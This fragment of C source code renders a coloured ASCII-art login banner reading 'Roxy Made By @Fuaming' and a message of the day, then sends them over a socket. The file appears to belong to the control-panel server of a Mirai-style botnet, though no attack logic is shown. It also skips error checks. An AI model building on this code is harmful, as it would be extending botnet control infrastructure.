		char ascii_banner_line0   [5000];
		char ascii_banner_line1   [5000];
		char ascii_banner_line2   [5000];
		char ascii_banner_line3   [5000];
		char ascii_banner_line4   [5000];
		char ascii_banner_line5   [5000];
		char ascii_banner_line6   [5000];
		char ascii_banner_line7   [5000];
		char ascii_banner_line8   [5000];
		char ascii_banner_line9   [5000];
		char ascii_banner_line10   [5000];
		char ascii_banner_line11   [5000];
		char ascii_banner_line12   [5000];
		char ascii_banner_line13   [5000];
		char ascii_banner_line14   [5000];
		FILE* fp1;
        char motd[255];
        char motd1[255];

        fp1 = fopen("logs/motd.txt", "r");

        while(fgets(motd, 255, (FILE*) fp1)) {
        sprintf(motd1, "%s\n", motd);
        }
        fclose(fp1);

		
  char clearscreen1 [2048];
  memset(clearscreen1, 0, 2048); 
  sprintf(clearscreen1, "\033[2J\033[1;1H");   	
  sprintf(ascii_banner_line0,  "\x1b[1;92m               𝓜𝓞𝓣𝓓:\e[0;93m %s\e[31\r\n", motd1);            
  sprintf(ascii_banner_line1,  "\x1b[1;97m♠𝓜𝓞𝓣𝓓: 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐑𝐨𝐱𝐲 𝐌𝐚𝐝𝐞 𝐁𝐲 @𝐅𝐮𝐚𝐦𝐢𝐧𝐠!☆                \r\n");
  sprintf(ascii_banner_line2,  "\x1b[1;91m                       ♠\x1b[1;96m██████╗  ██████╗ ██╗  ██╗██╗   ██╗\x1b[1;91m♠  \r\n");
  sprintf(ascii_banner_line3,  "\x1b[1;91m                       ♠\x1b[1;96m██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝\x1b[1;91m♠     \r\n");
  sprintf(ascii_banner_line4,  "\x1b[1;91m                       ♠\x1b[1;96m██████╔╝██║   ██║ ╚███╔╝  ╚████╔ \x1b[1;91m♠    \r\n");
  sprintf(ascii_banner_line5,  "\x1b[1;91m                       ♠\x1b[1;96m██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝\x1b[1;91m♠  \r\n");
  sprintf(ascii_banner_line6,  "\x1b[1;91m                       ♠\x1b[1;96m██║  ██║╚██████╔╝██╔╝ ██╗   ██║\x1b[1;91m♠  \r\n");
  sprintf(ascii_banner_line7,  "\x1b[1;91m                       ♠\x1b[1;96m╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝\x1b[1;91m♠    \r\n");
  sprintf(ascii_banner_line8,  "\x1b[1;96m\r\n");
  sprintf(ascii_banner_line9,  "\x1b[1;96m\r\n");
  sprintf(ascii_banner_line10, "\x1b[1;91m                 ♠\x1b[1;96m╔══════════════════════════════════════════╗\x1b[1;91m♠ \r\n");
  sprintf(ascii_banner_line11, "\x1b[1;91m                 ♠\x1b[1;96m║                                          ║\x1b[1;91m♠ \r\n"); 
  sprintf(ascii_banner_line12, "\x1b[1;91m                 ♠\x1b[1;96m║   书        𝖜𝖊𝖑𝖈𝖔𝖒𝖊 𝖙𝖔 Roxy       书     ║\x1b[1;91m♠\r\n");
  sprintf(ascii_banner_line13, "\x1b[1;91m                 ♠\x1b[1;96m║                                          ║\x1b[1;91m♠ \r\n");
  sprintf(ascii_banner_line14, "\x1b[1;91m                 ♠\x1b[1;96m╚══════════════════════════════════════════╝\x1b[1;91m♠ \r\n");




		if(send(datafd, clearscreen1,   		strlen(clearscreen1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;